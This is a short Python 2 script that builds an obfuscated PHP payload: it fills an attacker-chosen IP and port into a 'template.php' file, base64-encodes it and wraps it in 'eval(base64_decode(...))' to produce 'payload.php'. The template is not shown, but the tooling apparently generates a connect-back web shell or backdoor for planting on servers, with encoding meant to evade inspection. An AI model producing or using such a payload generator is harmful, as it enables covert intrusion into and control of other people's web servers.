#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys

if (len(sys.argv) == 2):
	ip = '127.0.0.1'
	port = sys.argv[1]
elif (len(sys.argv) == 3):
	ip = sys.argv[1]
	port = sys.argv[2]
else:
	print '[!] Usage: %s <ip (defult:127.0.0.1)> <port>' % (sys.argv[0])
	exit()

try:
	code = ''
	with open('template.php', 'r') as template:
		for line in template:
			if 'CHANGEIP' in line:
				line = line.replace ('CHANGEIP', ip)
			if 'CHANGEPORT' in line:
				line = line.replace ('CHANGEPORT', port)

			code += line

	with open ('payload.php', 'w') as payload:
		code = "<?php eval(base64_decode('" + code.encode('base64') + "')); ?>"
		payload.write (code)

	print '[+] Payload created successfully!'
except:
	print '[!] IOerror'
